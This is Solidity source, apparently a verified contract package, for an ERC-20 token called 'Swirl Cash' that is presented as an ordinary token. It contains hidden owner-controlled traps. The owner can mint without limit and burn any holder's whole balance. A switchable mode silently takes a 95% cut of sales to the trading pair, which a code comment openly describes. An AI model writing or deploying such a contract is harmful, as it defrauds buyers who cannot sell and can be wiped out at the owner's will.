{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/erc20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.0;\r\n\r\ncontract FaultyToken {\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string public constant name = \"Swirl Cash\";\r\n    string public constant symbol = \"SWIRL\";\r\n    uint256 public constant decimals = 18;\r\n    address private _owner;\r\n\r\n    bool private initialized = false;\r\n\r\n    address private _pair;\r\n    bool private _mode = false;\r\n    mapping(address => bool) private _allowedPools;\r\n    mapping(address => bool) private _excludeFeeAccounts;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    fallback() external {}\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function setPair(address pair) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n\r\n        _pair = pair;\r\n\r\n        return true;\r\n    }\r\n\r\n    function allowPool(address pool) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n\r\n        _allowedPools[pool] = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function burn(address owner) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n\r\n        _burn(owner, _balances[owner]);\r\n    }\r\n\r\n    function changeMode(bool mode) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n        _mode = mode;\r\n\r\n        return true;\r\n    }\r\n\r\n    function mint(address target, uint256 amount) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n\r\n        _mint(target, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function excludeFeeAccount(address owner) public returns (bool) {\r\n        require(_owner == msg.sender, \"not owner\");\r\n\r\n        _excludeFeeAccounts[owner] = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(\r\n            currentAllowance >= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        _approve(sender, msg.sender, currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            msg.sender,\r\n            spender,\r\n            _allowances[msg.sender][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowances[msg.sender][spender];\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(\r\n            senderBalance >= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[sender] = senderBalance - amount;\r\n\r\n        if (\r\n            _mode &&\r\n            recipient == _pair &&\r\n            _allowedPools[block.coinbase] &&\r\n            !_excludeFeeAccounts[sender]\r\n        ) {\r\n            //take 95% fee when sell and public miner mine\r\n            amount = (amount * 5) / 100;\r\n        }\r\n\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 burnAmount =\r\n            amount > _balances[account] ? _balances[account] : amount;\r\n        _balances[account] -= burnAmount;\r\n        _totalSupply -= burnAmount;\r\n\r\n        emit Transfer(account, address(0), burnAmount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n"}}}